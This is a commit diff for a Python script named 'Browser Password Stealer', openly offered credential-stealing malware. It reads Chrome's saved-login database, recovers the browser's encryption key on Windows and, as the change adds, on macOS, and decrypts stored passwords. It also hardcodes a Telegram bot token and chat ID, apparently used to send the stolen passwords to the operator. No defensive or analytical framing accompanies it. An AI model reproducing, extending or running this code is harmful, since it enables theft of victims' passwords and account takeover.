6066f4bafd1fe2629e681d1b46578fab22cc7014
Iksoft Technologies <62053085+iksoft@users.noreply.github.com>
2024-06-13 13:20:16 -0700

    updates

--- Browser Password Stealer.py
+++ Browser Password Stealer.py
@@ -3,38 +3,58 @@ import json
 import base64
 import sqlite3
 import shutil
-import win32crypt
-from Crypto.Cipher import AES
 import requests
+import sys
+import platform
+from Crypto.Cipher import AES
+
+if platform.system() == "Windows":
+    import win32crypt
+    import keyring
 
 BOT_TOKEN = '7191024189:AAGZHq2c6kYiAArvwWgv0Xd4WPQko_1N2E8'
 CHAT_ID = '6324121131'
 
 def get_chrome_login_db():
-    user_data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
+    if platform.system() == "Windows":
+        user_data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
+    elif platform.system() == "Darwin":
+        user_data_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
+    else:
+        raise Exception("Unsupported operating system")
     login_db = os.path.join(user_data_path, 'Login Data')
     return login_db
 
 def get_encryption_key():
-    local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
-    with open(local_state_path, 'r', encoding='utf-8') as f:
-        local_state = json.load(f)
-    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-    encrypted_key = encrypted_key[5:]
-    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    if platform.system() == "Windows":
+        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]
+        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    elif platform.system() == "Darwin":
+        local_state_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State')
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]
+        key = keyring.get_password("Chrome Safe Storage", "Chrome")  # Using keyring to access Mac keychain
+        if key:
+            key = key.encode('utf-8')
+        else:
+            raise Exception("Failed to retrieve encryption key from keychain.")
+    else:
+        raise Exception("Unsupported operating system")
     return key
 
 def decrypt_password(encrypted_password, key):
     try:
-        if encrypted_password[:3] == b'v10' or b'v11':
-            iv = encrypted_password[3:15]
-            encrypted_password = encrypted_password[15:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
-            return decrypted_password
-        else:
-            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-            return decrypted_password.decode()
+        iv = encrypted_password[3:15]
+        encrypted_password = encrypted_password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
+        return decrypted_password
     except Exception as e:
         print(f"Error decrypting password: {e}")
         return ''
